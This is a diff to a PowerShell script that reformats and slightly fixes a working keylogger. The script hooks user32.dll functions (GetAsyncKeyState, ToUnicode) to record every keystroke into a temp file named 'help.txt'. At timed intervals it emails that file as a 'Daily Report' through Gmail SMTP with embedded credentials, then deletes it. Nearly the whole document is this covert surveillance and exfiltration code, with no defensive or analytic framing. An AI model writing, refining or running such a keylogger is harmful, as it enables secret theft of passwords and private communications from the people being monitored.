@@ -7,18 +7,18 @@ $Subject = "Daily Report"
 $body = "Daily Report"
 $SMTPServer = "smtp.gmail.com"	# Gmail SMTP
 $SMTPPort = "587"
-$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
+$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 ############################
 
 $TimeStart = Get-Date
-$TimeEnd = $timeStart.addminutes($RunTimeP)
+$TimeEnd = $TimeStart.AddMinutes($RunTimeP)
 
 #requires -Version 2
-function Start-Helper($Path="$env:temp\help.txt") 
+function Start-Helper($Path="$env:temp\help.txt")
 {
   $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int GetKeyboardState(byte[] keystate);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -33,43 +33,54 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
-
     $Runner = 0
-	while ($TimesToRun  -ge $Runner) {
-	while ($TimeEnd -ge $TimeNow) {
-      Start-Sleep -Milliseconds 40
-      
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        $state = $API::GetAsyncKeyState($ascii)
+    while ($TimesToRun -ge $Runner)
+    {
+      $TimeNow = Get-Date
+      while ($TimeEnd -ge $TimeNow)
+      {
+        Start-Sleep -Milliseconds 40
 
-        if ($state -eq -32767) { 
-          $null = [console]::CapsLock
+        for ($ascii = 9; $ascii -le 254; $ascii++)
+        {
+          $state = $API::GetAsyncKeyState($ascii)
 
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
-
-          $mychar = New-Object -TypeName System.Text.StringBuilder
-
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-          if ($success) 
+          if ($state -eq -32767)
           {
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+            $null = [console]::CapsLock
+
+            $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+            $kbstate = New-Object Byte[] 256
+            $checkkbstate = $API::GetKeyboardState($kbstate)
+
+            $mychar = New-Object -TypeName System.Text.StringBuilder
+
+            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+            if ($success)
+            {
+              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+            }
           }
         }
+        $TimeNow = Get-Date
       }
-	  $TimeNow = Get-Date
+
+      # Send email with the collected data
+      Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+
+      # Clean up the temporary file
+      Remove-Item -Path $Path -Force
+
+      # Increment the runner counter
+      $Runner++
     }
-	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
-	Remove-Item -Path $Path -force
-	}
   }
   finally
   {
-	exit 1
+    exit 1
   }
 }
-Start-Helper
 
+Start-Helper
